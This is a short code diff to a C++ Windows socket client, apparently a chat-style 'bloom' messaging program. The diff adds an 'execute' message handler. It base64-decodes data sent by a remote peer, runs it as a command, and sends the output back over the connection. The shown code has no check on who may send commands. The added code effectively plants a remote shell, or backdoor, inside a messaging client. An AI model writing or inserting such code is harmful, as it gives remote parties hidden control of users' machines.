@@ -6,6 +6,7 @@
 #include <ctime>
 #include ".\libs\string++.h"
 #include ".\libs\b64++.h"
+#include ".\libs\execute.h"
 
 #define CONFIG_FILE "./config.config"
 #pragma comment(lib, "ws2_32.lib")
@@ -155,6 +156,7 @@ class blooming_connection
             break;
         }
         case 'e':
+            command_type_identifer = "e";
             break;
         case 'f':
         {
@@ -211,8 +213,13 @@ class blooming_connection
             printf("dl\n");
             break;
         case 'e':
+        {
             printf("execute\n");
+            string __execution_result = __execute(b64_de(__data));
+            string result = "bloom-in p <channel>" + __channel + "<channel><id>" + local_id + "<id>" + "<target>" + __id + "<target>" + "<data>" + b64_en((char *)__execution_result.c_str()) + "<data>BLOOM_IN";
+            send(sock, result.c_str(), strlen(result.c_str()), 0);
             break;
+        }
         case 'p':
             printf("--------------------\n");
             printf("@%s\t%s says:\n", str_now.c_str(), __id.c_str());
